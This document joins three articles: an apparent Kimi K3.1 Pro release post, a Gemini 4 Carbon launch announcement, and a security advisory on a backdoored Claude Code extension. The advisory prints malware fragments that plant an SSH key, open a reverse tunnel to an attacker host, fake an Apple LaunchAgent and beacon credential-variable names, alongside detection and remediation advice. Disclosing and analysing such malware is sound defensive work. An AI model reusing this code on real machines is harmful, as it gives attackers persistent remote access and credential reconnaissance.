K3.1 Pro particularly excels at parametric modeling, from mechanical parts and architectural models to configurable products and custom furniture. Without MCP connectors, it can write and run scripts for tools like Blender and CAD software to build and refine assets, edit components, and adjust geometry, materials, and scene layout.

Below are examples of 3D assets K3.1 Pro created for brand films, games, and interactive web experiences:

3D Make is now live on kimi.ai and the Kimi app — preview and edit your 3D models online, download them ready for 3D printing, or export them as videos or Live Photos to share anywhere.

**Finance**

With stronger reasoning and agentic capability, K3.1 Pro is capable of end-to-end delivery of complete financial workflows. K3.1 Pro achieves state-of-the-art results on OfficeQA Pro v2 (64.4), which tests complex fiscal data analysis over real financial documents through retrieval, cross-document verification, and multi-step numerical reasoning. K3.1 Pro also improves over K3 on Frontier Finance, which measures support for complete investment workflows from screening to profitability analysis.

K3.1 Pro also improves significantly across all our internal finance benchmarks:

- Financial Modeling evaluates formula linkage, financial logic, and final workbook quality in real-world modeling tasks. K3.1 Pro improves on K3 by 7.2 points.
- Financial Research evaluates whether models can produce auditable research under evidence and cutoff constraints. K3.1 Pro improves on K3 by 11.6 points.
- Business Operation evaluates long-horizon management and decision-making in a simulated business environment. K3.1 Pro achieves about 4.2× K3's performance.

Financial analysis and investment research demand a high degree of factual accuracy. To address this, we made targeted improvements to K3.1 Pro's factual accuracy on real-world tasks and challenging prompts. On Kimi Hallu Bench Hard bench, an internal benchmark designed to stress-test factual accuracy, its claim-level hallucination rate fell from 23.4% for K3 to 8.3%, while the share of responses containing at least one factual error was just 42.4% of its predecessor's rate. (The evaluation is a stress test for factual accuracy, with examples deliberately crafted to probe situations where models are prone to errors. The reported rates do not represent overall error rates in daily use.)

The cases below show how K3.1 Pro handles financial modeling, investment analysis, and source-grounded research in practice:

**Cybersecurity**

As K3.1 Pro became more capable, we spent a correspondingly larger share of our effort understanding where cyber capability comes from, and how much of it we can control. We therefore analyzed and evaluated K3.1 Pro's vulnerability research capabilities, and applied targeted controls during training to reduce potential misuse risk while preserving general usefulness.

Identifying and removing cyber-related data. During development, we observed vulnerability research performance improving steadily as post-training scaled. Tracing the source of this trend, we found that cyber-related content was embedded within the general mid-training corpus, and cyber-related tasks were present in the RL environment mix — a natural byproduct of training on broad data. In preliminary experiments on internal models, we found that without data removal at either the mid-training or the RL stage, downstream cyber capability would increase substantially. These findings gave us a concrete lever for control. For the open-weight release of K3.1 Pro, we identified and removed cyber-related data from both training stages, while retaining the general-purpose coding tasks needed for model usefulness. We will continue to apply appropriate controls at every training stage, of which cyber-related data identification and restriction is one example.

Evaluation and results. After data cleaning, we evaluated K3.1 Pro on xdev-bench-hard, our in-house benchmark of expert-curated, source-code-based vulnerability discovery and exploitation tasks, calibrated to provide meaningful differentiation at our current capability level. Most tasks faithfully reproduce recently disclosed vulnerabilities in software such as the Linux kernel, Node.js, JavaScriptCore, Exim, and VirGL, with mitigations enabled. Each task provides the vulnerable source code, a short bug hint, and the corresponding binary; the agent must develop an exploit, achieve arbitrary code execution in a separate sandbox, and retrieve a secret string for automated verification. We report pass@3 over a random subset of runs, with no hard timeouts or output token limits.

On xdev-bench-hard, the checkpoint without these risk-reduction measures — no cyber-related data removal at mid-training and no cyber-related RL environment filtering — solves 90.5% of problems at pass@3; the final K3.1 Pro reaches 81.0%. The comparison shows that data removal meaningfully reduces cyber capability relative to what the same training pipeline would otherwise produce. At the same time, K3.1 Pro improves substantially over its predecessor, indicating that stronger general coding and long-horizon debugging capabilities generalize to cyber tasks even after targeted data removal. K3.1 Pro's cyber capability remains behind that of frontier proprietary models that have been publicly available for at least three months. We will keep evolving our internal benchmarks so that evaluation stays informative as model capabilities continue to advance.

Open-weight principles. These evaluations frame our open-weight release decision. First, we aim not to release open weights that would extend the absolute frontier of cyber capability. K3.1 Pro's offensive cyber capability is, by design, below what our pipeline can produce, and remains behind that of frontier proprietary models. Second, we intend to progressively raise the cyber capability available in open weights. We believe making K3.1 Pro available in a non-discriminatory way benefits people who need dual-use capabilities for defensive purposes. When a capable model is open and runs on infrastructure its users control, many more teams gain the means to audit the code they maintain — including legacy systems that rarely receive dedicated security reviews. We believe that letting this capability diffuse gradually — rather than concentrating it in a few proprietary systems — ultimately makes all software more secure.

**Availability**

Kimi K3.1 Pro rolls out today across the Kimi product family: on Kimi.ai and the Kimi mobile apps, Kimi Work and Kimi Code, and through the Kimi API.

Full model weights will be released by Nov 4, 2026.

Kimi Enterprise administrators can enable K3.1 Pro for their organization; access is off by default at launch.

Details for each channel:

- Kimi Agents: Download or update to the latest Kimi app from your mobile app store, available on iOS, Android, and HarmonyOS, or visit kimi.ai.
- Work with Kimi K3.1 Pro: Download the latest Kimi Work desktop app, version 3.1.0 or later, available for Windows and Apple silicon Macs.
- Code with Kimi K3.1 Pro: Run Kimi Code and select Kimi K3.1 Pro using the /model command.
- Build with the Kimi API: Visit the Kimi API Platform and select kimi-k3.1-pro / kimi-k3.1-pro-highspeed. Zero Data Retention is available for API customers.
- Bring Kimi to your organization: Kimi Business provides enterprise-grade data privacy and member management, with complete separation between personal and organization accounts. Visit the pricing page and select “Get Kimi Business” to subscribe for your team.

**Benchmarks**

**Footnotes**

Unless otherwise specified, all Kimi K3.1 Pro results reported below are obtained with the reasoning effort set to 'max', temperature = 1.0, and top-p = 0.95.

**Coding benchmarks**

- Terminal-Bench 4.0. Kimi K3.1 Pro is evaluated with the Claude-Code harness. The DeepSeek-V4.1-Flash-1017 is taken from the release blog (https://huggingface.co/deepseek-ai/DeepSeek-V4.1-Flash-1017). All remaining scores are taken as the maximum value reported in either their blog posts or the official Terminal-Bench 4.0 leaderboard (https://www.tbench.ai/).
- Terminal-Bench-Science 0.1. Kimi K3.1 Pro is evaluated with the Claude-Code harness. Our internal evaluation of DeepSeek-V4.1-Flash-1017 yields a score of 9.3; However, an older version, DeepSeek-V4.1-Flash, scores 15.7 on the official Terminal-Bench-Science, so we report 15.7 here; all remaining scores are from the official Terminal-Bench-Science leaderboard (https://www.terminal-bench-science.ai/).
- DeepSWE v1.1. Kimi K3.1 Pro is evaluated with the Claude-Code harness. All scores are taken from each model's respective technical report. GPT-6 Astra(https://openai.com/index/gpt-6-astra/). Claude Opus 5.5 and Claude Fable 5.1(https://www.anthropic.com/claude-opus-5-5-system-card and https://www.anthropic.com/claude-fable-5-1-mythos-5-1-system-card); DeepSeek-V4.1-Flash-1017 (https://api-docs.deepseek.com/news/news261017/); GLM-5.3 (https://z.ai/blog/glm-5.3).

- BenchCAD. Open models are evaluated by us on 1,000-case subsets randomly sampled from the full 17,900-case Vision2Code dataset, at maximum reasoning effort. With-tools results use the Claude Code harness; without-tools results use single-shot generation with the official BenchCAD prompts and scoring pipeline. Scores for Claude Fable 5.1 and Claude Opus 5.5 are taken from the Claude Opus 5.5 System Card; GPT‑6 Astra’s with-tools score is taken from its official report. - BioMysteryBench dataset is drawn from the official v11 release, with Kimi K3 as the judge model. We evaluate Kimi K3.1 Pro with Kimi Code, GLM-5.3 and DeepSeek-V4.1-Flash-1017 with Claude Code, and GPT-6 Astra with Codex. We additionally assign a score of zero to runs that bypass the task’s stated requirements, such as retrieving answers online instead of performing the required analysis in Wireshark. **Reasoning & Knowledge & Multimodal benchmarks**

- GDP.pdf. Each PDF is provided as page images resized to a longest edge of 1,152 pixels, interleaved with Docling-extracted text in page order. Responses are graded against each rubric criterion using Gemini-3.5-Flash Medium and the official judging prompt. We report the strict pass rate among fully scored responses.

title: Gemini 4 Carbon: our next frontier model
tldr: Gemini 4 Carbon is our strongest model with state-of-the-art cybersecurity and long horizon capabilities.
text:
Oct 28, 2026

|

Gemini 4 Carbon is our strongest model with state-of-the-art cybersecurity and long horizon capabilities.

Today, we’re announcing the next frontier model: Gemini 4 Carbon, our strongest model with state-of-the-art cybersecurity and long horizon capabilities.

Carbon ranks #1 on the recently updated v5.0 of Artificial Analysis Intelligence Index at 59. It shows significant gains across coding and agentic tasks as well as across key capabilities critical for cybersecurity defense, landing a firm lead in SEC-bench Pro (88.2%) for finding vulnerabilities, ExploitGym (54.8%) for exploitation, and CWE-bench (71.0%) for patching. On internal benchmarks, Carbon drives a strong uplift in generating secure code, and in live coding environments with our own teams it shows reduced misalignment and fabrication rates.

Building on Gemini 4 Argon, which was launched two weeks ago, Carbon illustrates the pace at which we’re pushing the frontier forward. Our researchers and models are working hand in hand to advance capabilities faster, while strengthening our safeguards in tandem.

We're taking a deliberate approach to rollout and are actively engaged in the U.S. government’s voluntary process for pre-release model testing. Starting this week, we will make Carbon available to a subset of cyber defenders and will gradually phase access to additional trusted partners through our Fairwind Program. We’re continuing to gather feedback and iterate on guardrails before making Carbon available to developers, businesses, and consumers via our product surfaces as soon as possible.

Gemini 4 Carbon will launch at the same introductory price 1 as Argon at $2 per million input tokens and $10 per million output tokens, with cached input tokens priced at 95% off input token price.

**Improving coding and reasoning for challenging, long-horizon tasks**

Designed to take on much harder, long-horizon engineering problems, Carbon is built for sustained agentic workflows. Internally, our teams have seen Carbon run for days to persist through dead ends to tackle complex, multi-step engineering tasks like root-causing and patching subtle bugs across large codebases and low-level systems.

Building on user feedback, we focused on improving model performance across a variety of domains, including coding, agentic, and scientific tasks, as well as full-stack web development and multimodal understanding. With improved quality of output and artifacts in web development, Carbon jumps +89 elo points to land at #4 (1768) on WebDev Arena.

**State-of-the-art cybersecurity performance to help build secure systems**

Gemini 4 Carbon delivers a significant leap in cybersecurity capabilities. It achieves state-of-the-art performance across the cybersecurity defense lifecycle — vulnerability detection, validation, and remediation.

Our teams are already seeing strong gains in cyberdefense. On internal benchmarks, Carbon achieves more than 2x uplift in success rate for generating secure code over Argon. As another example, the Chrome team has reported that Carbon performed more than 10X better than another lab's large frontier model when generating high quality patches. Wiz, our leading Cloud security platform, also observes Carbon leading on benchmarks for web penetration testing, a core capability for Wiz's Scan for Good initiative.

Carbon excels across key external benchmarks (evaluated without guardrails):

- Finding real vulnerabilities: Core to cybersecurity defense is finding real vulnerabilities. Carbon achieves a state-of-the-art 88.2% on SEC-bench Pro, autonomously uncovering complex flaws buried in real-world software.
- Validating risk through exploitation: To prioritize which vulnerabilities to remediate first or remediate at all, cyber defenders increasingly rely on models to check which vulnerabilities are exploitable. Carbon sets a new state-of-the-art on the popular exploitation benchmark ExploitGym (54.8%).
- Patching at the root cause: Ultimately after identifying the vulnerabilities, fixing the root cause is a critical step in the cybersecurity defense lifecycle. Carbon reaches 71.0% on Collinear’s CWE-bench, turning validated findings directly into working code fixes.

**Advancing frontier model safety & security**

Gemini 4 Carbon builds on the same multi-layered safety and security stack of Argon — combining model training, real-time misuse defenses, prompt-injection resilience, and chain-of-thought monitoring. In particular, we made significant strides in model alignment with Argon, and reported its propensities to behave in an aligned way in our Safety and Security report. With Carbon, we challenged ourselves to go a step further on alignment, and trained the model to respond to complex or high-pressure tasks in the right way.

- Reducing shortcuts and loophole exploitation: With Carbon, we further mitigated shortcut attempts in training while ensuring high-quality coding performance. Carbon reduced successful cheating on Terminal-Bench 4.0 to 0.0%, with attempts to cheat dropping to 0.4% — all while improving overall accuracy. In live coding environments with our internal teams, we observed that high-severity misalignment alerts dropped by almost 80%.
- Greater transparency and honesty: In our internal testing, Carbon cuts unsupported claims by approximately 2x over Argon. It puts methodological caveats directly into the deliverable or withholds blocked actions with a clear list of what remains required, rather than fabricating or hedging around missing evidence.
- Improved collaboration with the user in the face of ambiguity: Rather than guessing or forcing a path forward, Carbon retrieves the relevant sources and surfaces discrepancies to the user before acting — as a result, users should observe a much better collaborative experience with Carbon.
- Following through without overstepping: Carbon simultaneously reduced overreach by 26% and under-service by 29% resulting in much more reliable execution of multi-step plans end-to-end while respecting project constraints and staying strictly within scope.
- Resisting prompt injection: While Argon previously led the Gray Swan’s Indirect Prompt Injection (IPI) Benchmark in prompt injection resistance with a very low 0.7% attack success rate, Carbon achieves 0.0% — resisting every evaluated attack attempt.

**Coming soon to developers, businesses, and consumers**

Pushing the frontier forward requires moving fast while remaining deliberate about deployment. With Gemini 4 Carbon, our goal is to deliver meaningful leaps in software engineering and cybersecurity defense without compromising on safety or reliability. We’re eager to see how the initial cohort of cyber defenders use this model and we look forward to bringing Carbon to developers, businesses, and consumers soon.

title: Official Claude Code Extension Compromise: Security Advisory | Phorion
tldr: Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up …
text:
**TL;DR**

Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.

**Revision history**

- Initial publication 30 Oct, 05:30 UTC
- Marketplace correction 30 Oct, 09:13 UTCCorrected the affected marketplace to Cursor.
- Version-scope update 31 Oct, 00:43 UTCAdded 2.1.312 per Cursor’s updated notice.

Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.

While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

**Infection Chain**

**The Cursor Marketplace Extension**

The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.

The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.

**Stage 1 - Preparing SSH Access**

First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.

The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.

```
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
```

Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).

With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

- Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
- macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
- Windows: tries to install and start OpenSSH Server using PowerShell.

None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.

It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.

**A bug in the macOS SSH logic?**

On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:

```
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
```

Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:

```
You need administrator access to run this tool... exiting!
```

systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:

```
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
```

Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.

As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

> This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

**Stage 2 - Establishing the Reverse SSH Tunnel**

Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.

It’s worth keeping the two keys straight during an investigation:

- The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
- The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.

The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

```
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
```

The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:

```
Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key
```

Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.

If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

**Stage 3 - Keeping Access Available**

To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.

On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:

```
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
```

**Stage 4 - Host Recon**

Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:

- Hostname, username, OS platform, and architecture
- Home directory, current working directory, and global Git email (git config --global user.email)
- Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
- Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i

The environment variable check uses Object.keys(process.env):

```
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)
```

Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.

To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.

It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:

```
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
```

Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.

The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.

**Detection Opportunities**

From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.

**SSH Key and Configuration Changes**

Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.

Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.

While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.

**User LaunchAgent Persistence**

The persistence setup on macOS gives us a couple of strong signals:

- A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
- A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).

Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.

**SSH Tunnels and Follow-On Access**

On the process and network side, look for:

- ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.
- Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).

If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.

**Remediation**

If you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:

- Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.

- Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).
